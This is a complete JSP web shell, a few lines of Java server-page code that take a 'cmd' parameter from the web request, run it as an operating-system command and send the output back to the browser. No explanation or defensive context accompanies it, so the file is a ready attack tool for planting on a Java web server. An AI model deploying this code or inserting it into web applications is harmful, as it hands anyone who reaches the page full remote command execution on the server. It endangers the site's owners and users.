<%@ page import="java.util.*,java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        int a;
        while ((a = in.read()) != -1) out.print((char)a);
    }
%>
